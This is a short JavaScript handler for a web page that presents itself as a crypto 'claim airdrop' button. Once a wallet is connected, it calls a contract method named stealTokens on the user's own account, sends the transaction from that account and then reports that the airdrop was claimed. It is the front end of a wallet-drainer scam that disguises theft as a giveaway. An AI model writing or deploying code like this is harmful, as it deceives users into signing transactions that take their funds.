async function claimAirdrop() {
    if (!accounts || accounts.length === 0) {
        alert('Please connect to a wallet first!');
        return;
    }

    if (!contractABI || !contractAddress) {
        alert('Contract details not loaded. Please try again later.');
        return;
    }

    const contract = new web3.eth.Contract(contractABI, contractAddress);
    try {
        console.log('Claiming airdrop...');
        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
        alert('Airdrop claimed successfully!');
    } catch (error) {
        console.error('Claim error:', error);
        alert('Error claiming airdrop');
    }
}

